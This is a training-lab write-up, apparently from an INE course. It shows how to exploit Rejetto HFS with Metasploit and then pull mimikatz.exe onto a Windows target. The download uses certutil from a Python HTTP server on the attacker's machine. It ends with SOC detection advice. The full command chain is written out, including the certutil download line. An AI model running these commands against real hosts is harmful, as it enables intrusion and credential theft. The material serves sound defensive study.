# INE Lab — File Transfer to Windows Targets

## Overview

This lab demonstrates how to transfer a file from a Kali Linux web server to a Windows target in an authorized lab environment.

### Lab flow

```text
Kali Linux
   |
   +-- searchsploit -> find a matching exploit
   |
   +-- Metasploit -> exploit vulnerable Rejetto HFS
   |
   +-- Meterpreter -> access Windows target
   |
   +-- Python HTTP Server -> host mimikatz.exe
                                  |
                                  | HTTP
                                  v
                           Windows Target
                                  |
                                  +-- certutil -> download file
```

> **Important:** Use these techniques only against the authorized INE lab target.

---

# 1. Search for a Rejetto Exploit

## Command

```bash
searchsploit rejetto
```

## Technical explanation

`searchsploit` searches the local Exploit-DB database for known exploits.

Here, `rejetto` is the search keyword.

```text
searchsploit
     |
     +-- Search Exploit-DB
             |
             +-- rejetto
             |
             +-- Matching exploits
```

The lab uses this to identify an exploit associated with the vulnerable Rejetto HTTP File Server.

### SOC perspective

This represents part of an attack workflow:

```text
Service discovery
      |
Version identification
      |
Exploit research
```

---

# 2. Load the Rejetto Metasploit Module

## Command

```text
use exploit/windows/http/rejetto_hfs_exec
```

## Technical explanation

The `use` command tells Metasploit which module to load.

The module path can be read as:

```text
exploit
  |
  +-- windows
       |
       +-- http
            |
            +-- rejetto_hfs_exec
```

The lab uses this module to exploit the vulnerable Rejetto HFS service and obtain a remote session.

---

# 3. Prepare the File on Kali

The lab uses `mimikatz.exe` as the file to demonstrate the transfer.

## Command

```bash
cd /usr/share/windows-resources/mimikatz/x64
```

## Technical explanation

`cd` means **change directory**.

This moves into Kali's directory containing the 64-bit Windows resource.

Check your location with:

```bash
pwd
```

List the files with:

```bash
ls
```

You should be able to locate:

```text
mimikatz.exe
```

---

# 4. Start a Python HTTP Server

## Command

```bash
python3 -m http.server 80
```

## Technical explanation

This starts Python's built-in HTTP server on TCP port `80`.

Breakdown:

| Part | Meaning |
|---|---|
| `python3` | Run Python 3 |
| `-m` | Run a Python module |
| `http.server` | Python's simple HTTP server |
| `80` | Listen on TCP port 80 |

Because the server is started inside the Mimikatz directory, the files in that directory become available through HTTP.

Conceptually:

```text
Kali
10.10.31.3
    |
    +-- HTTP Server :80
             |
             +-- mimikatz.exe
```

---

# 5. Download the File on Windows

## Command

```cmd
certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
```

## Technical explanation

`certutil.exe` is a legitimate Windows utility. In this lab, it is used to retrieve a file through its URL/cache functionality.

Breakdown:

| Part | Meaning |
|---|---|
| `certutil` | Windows certificate utility |
| `-urlcache` | Use URL/cache functionality |
| `-f` | Force retrieval/overwrite |
| `http://10.10.31.3/mimikatz.exe` | URL of the remote file |
| `mimikatz.exe` | Local filename |

The transfer looks like:

```text
Windows Target
      |
      | HTTP request
      v
10.10.31.3:80
      |
      +-- mimikatz.exe
      |
      v
Windows current directory
      |
      +-- mimikatz.exe
```

To verify the file after downloading:

```cmd
dir
```

---

# 6. Complete File-Transfer Workflow

### On Kali

Navigate to the file:

```bash
cd /usr/share/windows-resources/mimikatz/x64
```

Start the HTTP server:

```bash
python3 -m http.server 80
```

### On Windows

Download the file:

```cmd
certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
```

The result is a local copy of the file on the Windows target.

---

# 7. Command Cheat Sheet

| Command | Simple meaning |
|---|---|
| `searchsploit rejetto` | Search Exploit-DB for Rejetto exploits |
| `use exploit/windows/http/rejetto_hfs_exec` | Load the Rejetto Metasploit module |
| `cd /usr/share/windows-resources/mimikatz/x64` | Go to the Mimikatz directory |
| `python3 -m http.server 80` | Start an HTTP file server on port 80 |
| `certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe` | Download the file to Windows |

---

# 8. SOC Analyst Perspective

This lab demonstrates an attack chain that a SOC analyst should be able to recognize:

```text
Reconnaissance
      |
      v
Service discovery
      |
      v
Exploit research
      |
      v
Exploitation
      |
      v
Remote access
      |
      v
File transfer
      |
      v
Executable written to disk
```

## Network evidence

A defender could investigate:

- HTTP connections to unusual IP addresses
- Requests for executable files
- Unexpected connections from a Windows host

## Process evidence

Investigate suspicious use of:

```text
certutil.exe
```

Look at:

- Parent process
- Command line
- User
- Execution time
- Destination IP

## File evidence

Investigate:

- Newly created `.exe` files
- Unusual file locations
- File hashes
- Digital signatures

---

# 9. Why `certutil` Is Interesting

`certutil.exe` is a legitimate Windows utility.

However, legitimate operating-system tools can sometimes be abused by attackers. This is commonly associated with **Living off the Land (LotL)** techniques.

Therefore:

> `certutil.exe` running does not automatically mean an attack is happening.

Context matters.

For example, the following combination would be more suspicious:

```text
certutil.exe
      |
      +-- downloads an executable
      |
      +-- connects to an unusual IP
      |
      +-- creates a file in a temporary directory
      |
      +-- the downloaded file is executed
```

A SOC analyst should correlate these events instead of judging a single event in isolation.

---

# 10. Key Concepts to Remember

### Searchsploit

Searches Exploit-DB for known exploits.

```bash
searchsploit <keyword>
```

### Metasploit `use`

Loads a Metasploit module.

```text
use <module>
```

### `cd`

Changes the current directory.

```bash
cd <directory>
```

### Python HTTP Server

Creates a simple HTTP file server.

```bash
python3 -m http.server <port>
```

### Certutil

A legitimate Windows utility that can be abused for file retrieval.

```cmd
certutil -urlcache -f <URL> <output-file>
```

---

# 11. Final Takeaway

The main objective of this lab is understanding **how a file can be transferred from Kali Linux to a Windows target**.

The essential workflow is:

```text
Kali
 |
 +-- searchsploit
 |      |
 |      +-- Find exploit
 |
 +-- Metasploit
 |      |
 |      +-- Gain authorized lab access
 |
 +-- cd
 |      |
 |      +-- Locate file
 |
 +-- Python HTTP server
        |
        +-- Host file
                |
                | HTTP
                v
          Windows Target
                |
                +-- certutil
                     |
                     +-- Download file
```

For SOC learning, the bigger lesson is understanding the relationship between **service discovery, exploitation, remote access, file transfer, process activity, and detection evidence**.
